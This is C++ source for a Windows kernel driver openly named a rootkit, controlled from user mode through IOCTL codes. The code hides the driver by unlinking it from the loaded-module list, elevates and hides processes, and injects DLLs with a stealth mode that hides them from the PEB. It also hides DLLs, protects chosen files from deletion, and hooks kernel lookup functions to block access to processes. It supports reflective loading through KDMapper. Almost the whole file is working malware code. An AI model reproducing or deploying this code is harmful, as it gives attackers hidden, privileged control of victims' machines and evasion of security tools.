#include "main.h"
#pragma warning(push)
#pragma warning(disable: 4100)  // Unreferenced formal parameter
#pragma warning(disable : 4099)
//#define DRL // Uncomment if you want to reflectively load the driver.
#ifndef DRL
#define DL // if DL is defined then the driver is loaded via a service, like in normal routines.
#endif
// debug printing
void debug_print(PCSTR text) {
    KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, text));
}
/*
Globals
*/
PDRIVER_OBJECT g_DriverObject;
PDEVICE_OBJECT g_DeviceObject;
/*
Functions 
*/

static bool g_HasRegisteredCallbacks = false;
static bool g_HasSetupMemory = false;

VOID MsgClientWorkerRoutine(const char* MSG) {
    debug_print("[++] Called MSGClient.\n");
    MemoryHelper::MSGClient(MSG);
}

VOID MsgClientWorkerRoutine(PDEVICE_OBJECT DeviceObject, PVOID Context) {  
   UNREFERENCED_PARAMETER(DeviceObject);  
   const char* MSG = (const char*)Context;  
   debug_print("[++] Called MsgClientWorkerRoutine.\n");  
   MemoryHelper::MSGClient(MSG);  
} 

KSPIN_LOCK g_Lock;
KIRQL g_OldIrql;

void HideDriverHandler(PDRIVER_OBJECT DriverObject) {
    KIRQL oldIrql;

    // Raise IRQL to prevent race conditions
    KeAcquireSpinLock(&g_Lock, &oldIrql);

    __try {
        if (!DriverObject) {
            debug_print("[!] Invalid DriverObject!\n");
            __leave;
        }

        

        PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
        if (!entry || !MmIsAddressValid(entry)) {
            debug_print("[!] Invalid driver section.\n");
            __leave;
        }

        // Unlink from PsLoadedModuleList
        PLIST_ENTRY prevEntry = entry->InLoadOrderLinks.Blink;
        PLIST_ENTRY nextEntry = entry->InLoadOrderLinks.Flink;

        KeMemoryBarrier();

        // Essentially, skip over us when iterating over the loaded drivers.
        prevEntry->Flink = nextEntry;
        nextEntry->Blink = prevEntry;

        KeMemoryBarrier();

        debug_print("[+] Driver is now hidden.\n");
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        debug_print("[!] Exception while hiding driver.\n");
    }

    // Release the spinlock
    KeReleaseSpinLock(&g_Lock, oldIrql);
    debug_print("[+] Releasing spinlock in HideDriver function.\n");
}


/*
End Of Functions.
*/
namespace Rootkit {
    namespace codes {
        // CTL Codes to communicate with User Mode application.
        constexpr ULONG HideDriver =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x696, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG ElevateProcess =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x697, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG HideProcess =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x698, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG ProtectProcess =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x699, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG HideDLL =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x700, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG UnProtectProcess =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x701, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
#ifdef DL
        constexpr ULONG ProtectProcessOP =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x702, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG UnProtectProcessOP =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x703, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
#endif
        constexpr ULONG ProtectFile =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x704, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG UnProtectFile =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x705, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG DisableProtectionToAll =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x706, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        /*
        constexpr ULONG HideFile =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x707, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
            */
        constexpr ULONG InjectDLL =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x708, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG BlockAddress =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x709, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG BlockPIDAccess =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x710, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG DeleteAllHooks =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
    }
    struct Request {
        HANDLE process_id;
        WCHAR DLLName[256];
        WCHAR Path[MAX_PATH];
        WCHAR Filename[256];
        ADDRESS_RANGE addressToBlock;
        bool stealth;
    };

    NTSTATUS create(PDEVICE_OBJECT device_object, PIRP Irp) {
        UNREFERENCED_PARAMETER(device_object);

        IoCompleteRequest(Irp, IO_NO_INCREMENT);

        return Irp->IoStatus.Status;
    }

    NTSTATUS close(PDEVICE_OBJECT device_object, PIRP Irp) {
        UNREFERENCED_PARAMETER(device_object);

        IoCompleteRequest(Irp, IO_NO_INCREMENT);

        return Irp->IoStatus.Status;
    }


    NTSTATUS device_control(PDEVICE_OBJECT device_object, PIRP Irp) {
        UNREFERENCED_PARAMETER(device_object);
        int eval;
        debug_print("[+] Device control called.\n");

        /* By default, it is unsuccessful. */
        NTSTATUS status = STATUS_UNSUCCESSFUL;

        // This will determine which code was sent from the user mode app.
        PIO_STACK_LOCATION stack_irp = IoGetCurrentIrpStackLocation(Irp);

        // Access the request object sent from user mode.
        auto request = reinterpret_cast<Request*>(Irp->AssociatedIrp.SystemBuffer);

        if (stack_irp == nullptr || request == nullptr) {
            // to avoid an explosion (bsod) we will just complete request, if we didnt check for this our computer will crash with the kernel error code bsod. -- im guessing to myself the stop code would be PAGEFAULT_IN_NONPAGED_AREA since we accessing memory that should always be there, but its not.
            DbgPrint("[!] STACK_IRP OR REQUEST ARE NULLPTR, RETURNING.");
            IoCompleteRequest(Irp, IO_NO_INCREMENT);
            return STATUS_UNSUCCESSFUL;
        }

        // Declare DriverObject before the switch statement
        PDRIVER_OBJECT DriverObject = nullptr;

        // The target process we want to access, init here.
        static PEPROCESS target_process = nullptr;
        PIO_WORKITEM workItem = IoAllocateWorkItem(g_DeviceObject);
        debug_print("[+] Initiated Work-Item at control codes.\n");
        // finally handle the control code sent
        const ULONG control_code = stack_irp->Parameters.DeviceIoControl.IoControlCode;
        HANDLE pid = request->process_id;
        WCHAR* DLLName = request->DLLName;
        WCHAR* Path = request->Path;
        //WCHAR* Filename = request->Filename;
        bool stealth = request->stealth;
        ADDRESS_RANGE addressToBlock = request->addressToBlock;
        int retval;
        char buf[256];
        switch (control_code) {
        case codes::HideDriver:
            DriverObject = IoGetCurrentIrpStackLocation(Irp)->DeviceObject->DriverObject;
            if (!DriverObject) {
                debug_print("[!] Failed to get DriverObject.");
                break;
            }
            HideDriverHandler(DriverObject);
            break;
        case codes::ElevateProcess:
            //status = PsLookupProcessByProcessId(request->process_id, &target_process);
            eval = ProcessUtils::ElevateProcess(HandleToUlong(pid));
            if (eval == 1) {
                status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] Process with PID: %d has been elevated successfully", HandleToUlong(pid));
                if (NT_SUCCESS(status)) {
                    IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
                }
            }
            else if (eval == 0) {
                IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[+] Error occured during process elevation.");
            }
            break;
        case codes::HideProcess:
            eval = ProcessUtils::HideProcess(HandleToUlong(pid));
            if (eval == 1) {
                status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] Process with PID: %d has been hidden successfully", HandleToUlong(pid));
                if (NT_SUCCESS(status)) {
                    IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
                }
            }
            break;
        case codes::ProtectProcess:
            eval = ProcessUtils::ProtectProcess(HandleToUlong(pid));
            if (eval == 1) {
                if (workItem) {
                    DbgPrint("[+] Work Item Called at protect process.\n");
                    status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] Process with PID: %d has been protected successfully", HandleToUlong(pid));
                    if (NT_SUCCESS(status)) {
                        IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
                    }
                }
                else {
                    DbgPrint("[-] Work Item could not be initialized at protect process.\n");
                }
            }
            else if (eval == 0) {
                status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] Process with PID: %d is already critical.", HandleToUlong(pid));
                if (NT_SUCCESS(status)) {
                    IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
                }
                return status;
            }
            else if (eval == 2) {
                DbgPrint("[-] Failed to query information process.. Returning.\n");
                if (workItem) {
                    IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[-] Failed to query information process.. Returning from ProtectProcess.");
                }
                else {
                    debug_print("[-] Work Item could not be initialized.\n");
                }
            }
            break;
        case codes::HideDLL:
            eval = ProcessUtils::HideDLL(HandleToUlong(pid), DLLName);
            if (eval == 1) {
                status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] DLL \"%ws\" has been successfully hidden from process %d.", DLLName, HandleToUlong(pid));
                if (NT_SUCCESS(status)) {
                    IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
                }
            }
            else if (eval == 0) {
                IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[-] Could not hide the DLL from the process.");
            }
            break;
        case codes::UnProtectProcess:
            eval = ProcessUtils::UnProtectProcess(HandleToUlong(pid));
            if (eval == 1) {
                if (workItem) {
                    status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] Process with PID: %d has been unprotected successfully", HandleToUlong(pid));
                    if (NT_SUCCESS(status)) {
                        IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
                    }
                }
            }
            else if (eval == 0) {
                status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] Process with PID: %d is not critical, nothing changed.", HandleToUlong(pid));
                if (NT_SUCCESS(status)) {
                    IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
                }
            }
            break;
#ifdef DL
        case codes::ProtectProcessOP:
            if (Callbacks::AddProtectionProcess(HandleToUlong(pid))) {
                status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] Process with PID: %d has been protected successfully (ACCESS_DENIED Protection)", (int)HandleToUlong(pid));
                if (NT_SUCCESS(status)) {
                    IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
                }
            }
            else {
                IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[-] Protected PID list is full.");
            }
            break;
        case codes::UnProtectProcessOP:
            if (Callbacks::RemoveProtectionProcess(HandleToUlong(pid))) {
                status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] Process with PID: %d has been unprotected successfully (ACCESS_DENIED Protection)", (int)HandleToUlong(pid));
                if (NT_SUCCESS(status)) {
                    IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
                }
            }
            else {
                IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[-] Process was not found in protected list.");
            }
            break;
#endif
        case codes::ProtectFile:
            if (FileUtils::AddFile(Path)) {
                status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] File: %ws is now protected from deletion.", Path);
                if (NT_SUCCESS(status)) {
                    IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
                }
            }
            else {
                IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[-] Could not protect the file from deletion.");
            }
            break;
        case codes::UnProtectFile:
            if (FileUtils::RemoveFile(Path)) {
                status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] File: %ws is now unprotected.", Path);
                if (NT_SUCCESS(status)) {
                    IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
                }
            }
            else {
                IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[-] File was either not protected, or could not be unprotected.");
            }
            break;
        case codes::DisableProtectionToAll:
            FileUtils::ClearFileList();
            IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[-] File Protection list cleared.");
            break;
            /*
        case codes::HideFile:
            if (FileUtils::AddFileDir(Path)) {
                char buf[256];
                status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] File: %ws is now hidden.", Path);
                if (NT_SUCCESS(status)) {
                    IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
                }
            }
            else {
                IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[-] Could not hide the file.");
            }
            break;
            */
        case codes::InjectDLL:
            retval = ProcessUtils::InjectDLL(Path, HandleToUlong(pid), stealth);
            if (retval == STATUS_SUCCESS) {
                status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] DLL Has been injected successfully.\n");
                if (NT_SUCCESS(status)) {
                    IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
                }
            }
            else if (retval == STATUS_SUCCESS_WITH_STEALTH) {
                status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] DLL Has been injected successfully. -- STEALTH: DLL Has been hidden from PEB.\n");
                if (NT_SUCCESS(status)) {
                    IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
                }
            }
            else {
                status = RtlStringCbPrintfA(buf, sizeof(buf), "[-] Couldn't inject DLL, check debug.\n");
                if (NT_SUCCESS(status)) {
                    IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
                }
            }
            break;
        case codes::BlockAddress:
            status = HookingUtils::HookMemory(HandleToUlong(pid));
            if (status == STATUS_SUCCESS) {
                DbgPrint("[HOOK-CALLER] Memory Hook has been applied / updated.\n");
            }
            if (status == STATUS_INVALID_ADDRESS) {
                DbgPrint("[HOOK-CALLER-ERROR] Memory Hook couldn't be applied, STATUS_INVALID_ADDRESS returned.\n");
            }
            else {
                DbgPrint("[HOOK-CALLER-ERROR] General Error in Memory Hook, STATUS: %d", status);
            }
            status = RtlStringCbPrintfA(buf, sizeof(buf), "[-] STATUS Returned: %d\n", status);
            if (NT_SUCCESS(status)) {
                IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
            }
            break;
        case codes::BlockPIDAccess:
            status = HookingUtils::HookPsLookupProcessByProcessId(HandleToUlong(pid));
            if (status == STATUS_SUCCESS) {
                DbgPrint("[HOOK-CALLER] PsLookupProcessByProcessId Hook has been applied / updated.\n");
            }
            if (status == STATUS_INVALID_ADDRESS) {
                DbgPrint("[HOOK-CALLER-ERROR] PsLookupProcessByProcessId Hook couldn't be applied, STATUS_INVALID_ADDRESS returned.\n");
            }
            break;
        case codes::DeleteAllHooks:
            status = HookingUtils::DeleteAllHooks();
            if (status == STATUS_SUCCESS) {
                DbgPrint("[HOOK-DELETER] All hooks have been successfully detached and destroyed.\n");
            }
            else {
                DbgPrint("[HOOK-DELETER-ERROR] An error has occured when attempting to delete hooks. | STATUS: %d\n", status);
            }
            break;
        default:
            // something is horribly wrong
            debug_print("[!] Unknown control code received!");
            break;
        }
        Irp->IoStatus.Status = status;
        Irp->IoStatus.Information = sizeof(Request);
        IoCompleteRequest(Irp, IO_NO_INCREMENT);

        return status;
    }
}

extern "C"
VOID UnloadDriver(PDRIVER_OBJECT DriverObject) {
    debug_print("[+] UnloadDriver called.\n");

    // Delete symbolic link
    UNICODE_STRING symbolic_link = RTL_CONSTANT_STRING(L"\\DosDevices\\rootkit");
    IoDeleteSymbolicLink(&symbolic_link);
    debug_print("[+] Symbolic link deleted.\n");
    // Unregister callbacks
#ifdef DL
    if (g_HasRegisteredCallbacks) {
        Callbacks::UnregisterCallbacks();
    }
#endif
#ifdef DL
    if (g_HasSetupMemory) {
        MemoryHelper::CleanupSharedMemory();
    }
#endif
    // Delete device object(s)
    PDEVICE_OBJECT device_object = DriverObject->DeviceObject;
    while (device_object) {
        PDEVICE_OBJECT next_device = device_object->NextDevice;
        IoDeleteDevice(device_object);
        device_object = next_device;
    }
#ifdef DL
    DbgPrint("[+] Attempting to set global variables to null.\n");
    g_DeviceObject = NULL;
    g_DriverObject = NULL;
#endif
    if (FileUtils::Callbacks[0].Activated) {
        FileUtils::UninstallNTFSHook(IRP_MJ_CREATE);
    }
    if (FileUtils::Callbacks[1].Activated) {
        FileUtils::UninstallNTFSHook(IRP_MJ_DIRECTORY_CONTROL);
    }
    debug_print("[+] Device object(s) deleted.\n");
}

extern "C"
NTSTATUS DriverMain(PDRIVER_OBJECT driver_object, PUNICODE_STRING registry_path) {
    UNREFERENCED_PARAMETER(registry_path);

    UNICODE_STRING device_name = {};
    RtlInitUnicodeString(&device_name, L"\\Device\\rootkit");

    PDEVICE_OBJECT device_object = nullptr;
    NTSTATUS status = IoCreateDevice(driver_object, 0, &device_name, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN,
        FALSE, &device_object);

    if (status != STATUS_SUCCESS) {
        debug_print("[!] Failed to create device driver.\n");
        return status;
    }

    debug_print("[+] Device driver creation successful.\n");

    // Create symlink

    UNICODE_STRING symbolic_link = {};
    RtlInitUnicodeString(&symbolic_link, L"\\DosDevices\\rootkit");

    status = IoCreateSymbolicLink(&symbolic_link, &device_name);

    if (status != STATUS_SUCCESS) {
        debug_print("[!] Failed to create symbolic link.\n");
        return status;
    }

    debug_print("[+] Driver symbolic link creation successful.\n");

#ifdef DL // If the driver is loaded via a service and not reflectively, register callbacks.
    NTSTATUS status1 = Callbacks::SetupCallbacks(device_object, symbolic_link);
    if (status1 == STATUS_UNSUCCESSFUL) { // No callbacks.
        g_HasRegisteredCallbacks = false;
    }
    else {
        g_HasRegisteredCallbacks = true;
    }
#endif
#ifdef DL
    status = MemoryHelper::SetupSharedMemory();
    if (status == STATUS_UNSUCCESSFUL) {
        g_HasSetupMemory = false;
    }
    else {
        g_HasSetupMemory = true;
    }
#endif
    // Setup IOCTL Comm.
    // Allow us to send small amounts of data between user-mode/kernel-mode
    SetFlag(device_object->Flags, DO_BUFFERED_IO);

    // Set the driver handlers to our function with our logic.
    driver_object->MajorFunction[IRP_MJ_CREATE] = Rootkit::create;
    driver_object->MajorFunction[IRP_MJ_CLOSE] = Rootkit::close;
    driver_object->MajorFunction[IRP_MJ_DEVICE_CONTROL] = Rootkit::device_control;

    ClearFlag(device_object->Flags, DO_DEVICE_INITIALIZING);
    
#ifdef DL
    driver_object->DriverUnload = UnloadDriver;
    g_DriverObject = driver_object;
    g_DeviceObject = device_object;
#endif
    debug_print("[+] Device initialized successfully.\n");

    return status;
}

extern "C"
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    debug_print("[+] DriverEntry called\n");

    UNICODE_STRING driver_name = {};
    RtlInitUnicodeString(&driver_name, L"\\Driver\\rootkit");
    /*
	In a normal driver, we wouldn't do IoCreateDriver, since this is manual mapping (using KDMapper), we need to use this function to create the driver.
    But if this is used as a service in windows, Windows already does this for us, meaning all of the code in DriverMain above will exist here in DriverEntry.
    */
#ifdef DRL
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);
    debug_print("[!] Driver is reflectively loaded\n");
    return IoCreateDriver(&driver_name, &DriverMain);
#else
    return DriverMain(DriverObject, RegistryPath);
#endif
}
